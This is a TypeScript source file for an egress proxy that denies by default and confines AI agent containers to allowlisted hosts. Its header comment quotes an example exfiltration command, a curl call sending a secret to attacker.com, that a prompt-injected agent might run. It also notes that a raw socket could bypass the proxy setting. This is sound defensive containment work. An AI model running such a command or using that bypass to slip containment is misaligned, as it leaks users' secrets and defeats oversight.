/**
 * Egress proxy — orchestrator-controlled default-deny forward proxy for session
 * containers (docs/172-agent-containment Gap 1, SHI-90).
 *
 * Session containers are pointed at this proxy via `HTTP_PROXY`/`HTTPS_PROXY`
 * (injected in `container-lifecycle.ts` `buildEnv`). The proxy enforces a host
 * {@link EgressAllowlist}: a request to an allowlisted host is forwarded, and a
 * request to anything else gets a **403** (HTTP) or an immediate connection
 * close with a 403-style status line (CONNECT). That is the "default-deny +
 * allowlist" backstop — an injected agent that does
 * `curl https://attacker.com/?d=$SECRET` cannot reach the host.
 *
 * Two request shapes are handled, covering essentially all agent egress:
 *   - **CONNECT host:port** — the HTTPS tunnel form. `git`, `npm`, `curl`,
 *     `fetch`, and the agent CLIs all issue CONNECT for `https://` URLs when a
 *     proxy is set. We never terminate TLS; we only gate on the requested host
 *     and then blind-pipe bytes (so this is transport-level, not identity-
 *     validating — that's Phase 2, see docs/172).
 *   - **absolute-form HTTP** (`GET http://host/path`) — plain-HTTP proxying.
 *
 * Enforcement note (the part that makes this a real backstop, not advice):
 * the env var alone is bypassable by an agent that opens a raw socket. The
 * companion is a network-layer default-deny so the proxy is the *only* route
 * off the container — see docs/172 Gap 1 and `shipit-docs/security.md`. This
 * module is that route's gatekeeper.
 *
 * Wiring mirrors `docker-proxy.ts`: `createEgressProxy` returns an
 * `http.Server` the caller binds on an ephemeral port and advertises to the
 * container manager (`setEgressProxy`), which injects the address into each
 * container's proxy env vars.
 */

import http from "node:http";
import net from "node:net";
import type { Duplex } from "node:stream";
import type { EgressAllowlist } from "./egress-allowlist.js";
import { normalizeHost } from "./egress-allowlist.js";

export interface EgressProxyDeps {
  /** The allowlist predicate. Re-read per request, so a live allowlist works. */
  allowlist: EgressAllowlist;
  /**
   * Optional hook fired when a host is denied. Used for observability /
   * security logging. `kind` distinguishes the tunnel form from plain HTTP.
   */
  onDenied?: (host: string, kind: "connect" | "http") => void;
  /** Optional hook fired when a host is allowed (forwarded). */
  onAllowed?: (host: string, kind: "connect" | "http") => void;
}

/** Split a `host:port` authority (CONNECT target) into parts. Default port 443. */
export function parseConnectTarget(target: string): { host: string; port: number } | null {
  if (!target) return null;
  // IPv6 literal form: [::1]:443
  const v6 = /^\[([^\]]+)\]:(\d+)$/.exec(target);
  if (v6) {
    const port = Number(v6[2]);
    return Number.isInteger(port) && port > 0 && port <= 65535 ? { host: v6[1], port } : null;
  }
  const idx = target.lastIndexOf(":");
  if (idx === -1) {
    return { host: target, port: 443 };
  }
  const host = target.slice(0, idx);
  const port = Number(target.slice(idx + 1));
  if (!host || !Number.isInteger(port) || port < 1 || port > 65535) return null;
  return { host, port };
}

/**
 * Create the egress forward proxy server. The caller is responsible for
 * `listen()`-ing it (typically on an ephemeral port bound to 0.0.0.0).
 */
export function createEgressProxy(deps: EgressProxyDeps): http.Server {
  const { allowlist, onDenied, onAllowed } = deps;

  const server = http.createServer((req, res) => {
    // Plain-HTTP proxying: the agent's client sends an absolute-form URL
    // (`GET http://host/path HTTP/1.1`). Anything else (a relative path, e.g. a
    // direct hit on the proxy's own address) is not a valid proxy request.
    let target: URL;
    try {
      target = new URL(req.url ?? "");
    } catch {
      res.writeHead(400, { "content-type": "text/plain" });
      res.end("egress-proxy: malformed proxy request\n");
      return;
    }
    const host = normalizeHost(target.hostname);

    if (!allowlist.isAllowed(host)) {
      onDenied?.(host, "http");
      res.writeHead(403, { "content-type": "text/plain" });
      res.end(`egress-proxy: host not allowed: ${host}\n`);
      return;
    }
    onAllowed?.(host, "http");

    const port = target.port ? Number(target.port) : 80;
    const upstream = http.request(
      {
        host: target.hostname,
        port,
        method: req.method,
        path: target.pathname + target.search,
        headers: req.headers,
      },
      (upstreamRes) => {
        res.writeHead(upstreamRes.statusCode ?? 502, upstreamRes.headers);
        upstreamRes.pipe(res);
      },
    );
    upstream.on("error", () => {
      if (!res.headersSent) res.writeHead(502, { "content-type": "text/plain" });
      res.end("egress-proxy: upstream error\n");
    });
    req.pipe(upstream);
  });

  // HTTPS tunneling: `CONNECT host:port`. This is the dominant path — almost
  // all agent/git/registry traffic is HTTPS.
  server.on("connect", (req: http.IncomingMessage, clientSocket: Duplex, head: Buffer) => {
    const parsed = parseConnectTarget(req.url ?? "");
    if (!parsed) {
      writeConnectStatus(clientSocket, 400, "Bad Request");
      clientSocket.end();
      return;
    }
    const host = normalizeHost(parsed.host);

    if (!allowlist.isAllowed(host)) {
      onDenied?.(host, "connect");
      // 403 status line, then close. The client surfaces this as a tunnel
      // failure — exactly what an exfil attempt to a denied host should hit.
      writeConnectStatus(clientSocket, 403, "Forbidden");
      clientSocket.end();
      return;
    }
    onAllowed?.(host, "connect");

    const upstream = net.connect(parsed.port, parsed.host, () => {
      writeConnectStatus(clientSocket, 200, "Connection Established");
      if (head && head.length > 0) upstream.write(head);
      upstream.pipe(clientSocket);
      clientSocket.pipe(upstream);
    });

    const tearDown = (): void => {
      upstream.destroy();
      clientSocket.destroy();
    };
    upstream.on("error", () => {
      if (!clientSocket.destroyed) {
        writeConnectStatus(clientSocket, 502, "Bad Gateway");
      }
      tearDown();
    });
    clientSocket.on("error", tearDown);
  });

  return server;
}

/** Write a bare HTTP/1.1 status line + blank line to a CONNECT client socket. */
function writeConnectStatus(socket: Duplex, code: number, message: string): void {
  try {
    socket.write(`HTTP/1.1 ${code} ${message}\r\n\r\n`);
  } catch {
    // Socket may already be torn down — nothing to do.
  }
}
